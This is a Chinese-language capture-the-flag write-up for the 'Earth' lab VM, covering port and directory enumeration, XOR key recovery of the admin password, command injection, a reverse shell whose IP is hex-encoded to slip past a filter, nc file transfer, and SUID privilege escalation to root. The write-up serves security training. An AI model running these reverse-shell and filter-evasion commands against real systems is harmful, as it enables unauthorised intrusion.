+++
title = "The planets earth"
date = 2026-03-11
draft = false
weight = 1
tags = ["XOR脚本", "命令注入", "绕过", "SUID提权", "逆向分析"]
+++

# 总结
信息收集发现web服务和管理后台，利用xor加密特性破解管理员密码，成功获取用户权限并通过16位转换绕过反弹shell，通过分析SUID文件并创建触发器文件提权到root

# 一、信息收集
## 1.1 端口信息收集

```zsh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- 192.168.174.133 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 02:51 EST
Nmap scan report for 192.168.174.133
Host is up (0.00068s latency).
Not shown: 65373 filtered tcp ports (no-response), 159 filtered tcp ports (admin-prohibited)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Test Page for the HTTP Server on Fedora
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
MAC Address: 00:0C:29:47:0F:CB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router|storage-misc
Running (JUST GUESSING): Linux 4.X|5.X|6.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%), Synology DiskStation Manager 5.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:6.0 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 4.19 (95%), OpenWrt 21.02 (Linux 5.4) (95%), Linux 6.0 (95%), Linux 5.4 - 5.10 (91%), Linux 2.6.32 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.68 ms 192.168.174.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.28 seconds
```

在443/tcp端口的`ssl-cert`部分发现域名信息，说明该ip在http服务中配置了两个域名：
  - `earth.local`
  - `terratest.earth.local`
```ZSH
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
```

由于这是`.local`域名，kali无法直接通过浏览器访问，需要进行本地DNS解析映射（在`/etc/hosts`文件中添加ip地址和域名）
`sudo nano /etc/hosts`，加入192.168.174.133 earth.local terratest.earth.local

## 1.2 Web信息收集
### 1.2.1 域名earth.local
访问`https://earth.local`，发现可以发送信息，但需要密钥，还有加密的Previous Messages
**注意：这里用https，因此443端口是https，80端口才是http**
Previous Messages:
```
00
    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

```ZSH
gobuster dir -u http://earth.local -w /usr/share/dirb/wordlists/common.txt
```
发现`/admin`目录，访问后是登录界面
发现`/cgi-bin/`目录，禁止访问

### 1.2.2 子域名terratest.earth.local
```ZSH
gobuster dir -u https://terratest.earth.local -w /usr/share/dirb/wordlists/common.txt -k
```

- 其中`-k`忽略证书问题引起的验证错误，继续连接

结果有如下内容，接着访问`https//terratest.earth.local/robots.txt`

```
/index.html           (Status: 200) [Size: 26]
/robots.txt           (Status: 200) [Size: 521]
```
发现有testingnotes文件，测试为txt格式，接着访问`https://terratest.earth.local/testingnotes.txt`，获得如下信息
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```
  - 得知加密算法为XOR
  - 用户名为`terra`
  - 存在`testdata.txt`文件用于测试加密

接着访问`https://terratest.earth.local/testdata.txt`，获得如下信息
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

**梳理下来**，目前重要url有：
https://earth.local/
https://earth.local/admin/
https://terratest.earth.local/robots.txt
https://terratest.earth.local/testingnotes.txt
https://terratest.earth.local/testdata.txt

重要数据有：
  - testdata中数据
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

  - earth.local中数据，Previous Messages:

```
00
    37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
    3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
    2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```
# 二、漏洞攻击
## 2.1 密码破解
  根据提示，用XOR（异或）加密算法解密，编写的python脚本中，只用了`previous messages`中的最后一段，这是因为XOR运算具有**排他性**和**长度匹配原则**
  在`testdata.txt`文件中的已知明文长度约为300~400字节，而`previous messages`中只有第三段数据基本吻合，这三段数据可能是：第一段你好，第二段今天天气不错，第三段是地球起源介绍，如果用一段400字符长的文本去异或一段50字符长的数据，结果只有前50字节有意义
  即明文A被密钥B加密，生成的密文C字节长度一定等于明文A的字节长度，十六进制的密文共有790个字符，十六进制中，每2个字符代表1个字节，790/2=395字节，而英文包含了字母、空格、逗号、句号，UTF-8编码下，标准英文字符每个占1字节
  长度对比：记事本统计显示：字符数为403，十六进制数据长度换算后为395字节，暂时没弄清为什么这样

编写python脚本
```python
# 第一段数据（十六进制字符串）
hex_data = "2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"

# 第二段数据（文本字符串）
text_data = "According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."

# 将16进制字符串转为原始2进制字节
data1 = bytes.fromhex(hex_data)

# 将参考文本转为2进制字节
data2 = text_data.encode('utf-8')

# 对 data2 进行循环填充，使其长度与 data1 一致
data2_padded = (data2 * (len(data1) // len(data2) + 1))[:len(data1)]

# 逐字节异或
result = bytes([a ^ b for a, b in zip(data1, data2_padded)])

# 输出异或结果（十六进制形式）
print("XOR Result (Hex):", result.hex())

# 尝试将异或结果解码为文本（UTF-8）
try:
    decoded_text = result.decode('utf-8')
    print("Decoded Text:", decoded_text)
except UnicodeDecodeError:
    print("Result is not readable as UTF-8 text.")
```

运行python脚本
```ZSH
┌──(kali㉿kali)-[~/Desktop/vulnhub/earth]
└─$ python xor.py                           
XOR Result (Hex): 6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174
Decoded Text: earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```
  - 输出为重复的`earthclimatechangebad4humans`，推测为管理员密码

## 2.2 获取user_flag
使用账户名`terra`，以及密码`earthclimatechangebad4humans`，进行登录。
见到CLI command界面，运行id，得到`Command output: uid=48(apache) gid=48(apache) groups=48(apache)`，发现这里是一个command injection的命令窗口

尝试直接查找flag，`find / -name "*flag*"`，结果有`/var/earth_web/user_flag.txt`
查看此文件，发现结果
```
Command output: [user_flag_3353b67d6437f07ba7d34afd7d2fc27d] 
```
获得了普通用户权限的flag

## 2.3 反弹shell
尝试直接使用反弹shell，在kali中监听`nc -lvnp 7777`，接着命令注入`bash -i >& /dev/tcp/192.168.174.131/7777 0>&1`，但被拦截
尝试将IP转换为十六进制格式，创建一个python脚本，
```python
import socket
print(socket.inet_aton('192.168.203.129').hex().upper())
```
  - `inet_aton`(即Internet Address to Network format，将互联网地址转换为网络字节序)，4字节原始二进制数据，得到的是一个`bytes`对象`b'\xc0\xa8\...\...`
  - `.hex()`将二进制字节转换为十六进制
  - `.upper()`将所有字母转换成大写
得到`C0A8AE83`，在前面加上0x，符合十六进制整数规范
注入`bash -i >& /dev/tcp/0xC0A8AE83/7777 0>&1`，成功反弹。

# 三、提权
## 3.1 查找可提权命令
找具有SUID权限的文件
`find / -perm -u=s -type f 2>/dev/null`，结果中有`/usr/bin/reset_root`文件

## 3.2 reset_root分析
启动`reset_root`文件
```ZSH
bash-5.1$ reset_root
reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```
失败，所有触发器都不存在

本地没有调试命令，使用nc传送到本地调试
```shell
# kali，输出重定向，将接收到的网络数据保存到名为reset_root的新文件中
nc -lnvp 7777 > reset_root
# 反弹来的靶机的shell中，输入重定向，将靶机原本有的reset_root文件内容喂给nc，通过网络发出去
nc 192.168.203.129 7777 < /usr/bin/reset_root
```

赋予执行权限，使用strace调试，`sudo strace ./reset_root`，发现没有如下文件：
```ZSH
chmod +x ./reset_root
access("/dev/shm/kHgTFI5G", F_OK)       = -1 ENOENT (No such file or directory)
access("/dev/shm/Zw7bV9U5", F_OK)       = -1 ENOENT (No such file or directory)
access("/tmp/kcM0Wewe", F_OK)           = -1 ENOENT (No such file or directory)
```
这是程序在询问内核，这个文件是否存在，内核回答不存在，由于这三个文件都不存在，程序走到了`RESET FAILED`的逻辑

于是靶机上创建这三个文件，再次运行reset_root
```ZSH
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

得到如下信息
```
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```
得到了root密码`Earth`，使用`su root`切换为root模式，再`cd /root`，`cat root_flag.txt`，得到最终flag`[root_flag_b0da9554d29db2117b02aa8b66ec492e]`
